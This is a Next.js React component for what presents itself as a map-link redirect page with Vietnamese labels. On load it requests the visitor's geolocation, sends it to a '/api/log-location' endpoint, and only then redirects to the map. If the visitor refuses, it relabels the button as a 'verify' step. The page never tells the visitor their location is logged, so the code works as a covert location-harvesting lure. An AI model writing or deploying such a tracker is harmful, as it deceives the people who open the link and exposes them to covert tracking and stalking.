'use client';

import { useEffect, useState, useCallback } from 'react';
import Image from 'next/image';
import { Button } from '@/components/ui/button';
import { MapPin, ArrowUpRight, Loader2, ShieldCheck } from 'lucide-react';
import type { MapLinkConfig } from '@/app/actions/map-links';
import { useLocationLogger } from '@/hooks/use-location-logger';

interface MapRedirectClientProps {
  redirectUrl: string;
  config: MapLinkConfig;
}

export function MapRedirectClient({ redirectUrl, config }: MapRedirectClientProps) {
  const [status, setStatus] = useState<'loading' | 'denied' | 'idle'>('loading');
  const { log } = useLocationLogger('/api/log-location', { from: 'link' });

  const requestLocation = useCallback(() => {
    setStatus('loading');

    log({
        onSuccess: () => {
            window.location.href = redirectUrl;
        },
        onError: (error) => {
            if (error?.code === 1) { // PERMISSION_DENIED
                setStatus('denied');
            } else {
                // For other errors, just redirect
                window.location.href = redirectUrl;
            }
        }
    });

  }, [log, redirectUrl]);
  
  useEffect(() => {
    const timer = setTimeout(requestLocation, 500);
    return () => clearTimeout(timer);
  }, [requestLocation]);

  const getButtonContent = () => {
    switch(status) {
      case 'loading':
        return (
          <>
            <Loader2 className="mr-2 h-5 w-5 animate-spin" />
            Đang xử lý...
          </>
        );
      case 'denied':
        return (
          <>
            <ShieldCheck className="mr-2 h-5 w-5" />
            Xác minh & Mở bản đồ
          </>
        );
      case 'idle':
      default:
        return (
          <>
            <ArrowUpRight className="mr-2 h-5 w-5" />
            Mở trong ứng dụng Bản đồ
          </>
        );
    }
  }
  
  return (
    <div className="flex flex-col min-h-svh bg-background">
      {/* Image Header */}
      <div className="relative w-full h-60 sm:h-72 flex-shrink-0">
        <Image 
          src={config.imageUrl}
          alt={config.title}
          layout="fill"
          objectFit="cover"
          priority
        />
        <div className="absolute inset-0 bg-gradient-to-t from-black/60 to-transparent" />
      </div>

      {/* Content Body */}
      <div className="flex-grow flex flex-col">
        <div className="p-5 flex-grow">
          <div className="flex items-start gap-4">
              <div className="bg-muted/80 p-3 rounded-lg mt-1">
                  <MapPin className="h-6 w-6 text-foreground/80" />
              </div>
              <div>
                  <h1 className="text-xl font-bold text-foreground">{config.title}</h1>
                  <p className="text-sm text-muted-foreground mt-1">{config.description}</p>
              </div>
          </div>
        </div>
        
        {/* Footer Action Button */}
        <div className="bg-background p-4 border-t sticky bottom-0">
          <Button 
            className={`w-full h-12 text-base font-semibold ${status === 'denied' ? 'bg-primary' : ''}`}
            onClick={requestLocation}
            disabled={status === 'loading'}
          >
            {getButtonContent()}
          </Button>
        </div>
      </div>
    </div>
  );
}
